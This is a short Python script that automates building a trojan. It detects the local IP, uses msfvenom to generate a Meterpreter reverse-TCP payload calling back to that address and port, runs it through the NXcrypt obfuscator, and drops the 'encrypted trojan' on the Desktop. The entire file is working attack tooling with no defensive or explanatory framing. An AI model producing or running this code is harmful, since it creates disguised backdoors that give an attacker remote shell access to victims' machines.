import os
import re

try:
    ifconfig_output = os.popen("ifconfig").read()
    ip_address_match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)\s+netmask", ifconfig_output)
    if ip_address_match:
        ip_address = ip_address_match.group(1)
    else:
        raise Exception("Could not obtain IP address using ifconfig command.")
except:
    try:
        # try using ip command
        ip_output = os.popen("ip addr show").read()
        ip_address_match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/\d+\s+brd", ip_output)
        if ip_address_match:
            ip_address = ip_address_match.group(1)
        else:
            raise Exception("Could not obtain IP address using ip command.")
    except:
        print("Error: Could not obtain IP address.")
        exit()

print("Retrieved ip: " + ip_address)

port_number = input("Enter the port number: ")

output_name = input("Enter the output name: ")

command1 = f"msfvenom --payload=python/meterpreter/reverse_tcp LHOST={ip_address} LPORT={port_number} --out=./NXcrypt/{output_name}.py"
os.system(command1)

os.chdir("./NXcrypt")

command2 = f"sudo python2 ./NXcrypt.py --file={output_name}.py --output={output_name}_obfuscated.py"
os.system(command2)

command3 = f"mv {output_name}_obfuscated.py ../Desktop/{output_name}_obfuscated.py"
os.system(command3)

print("Completed. Check the Desktop for your encrypted trojan.")
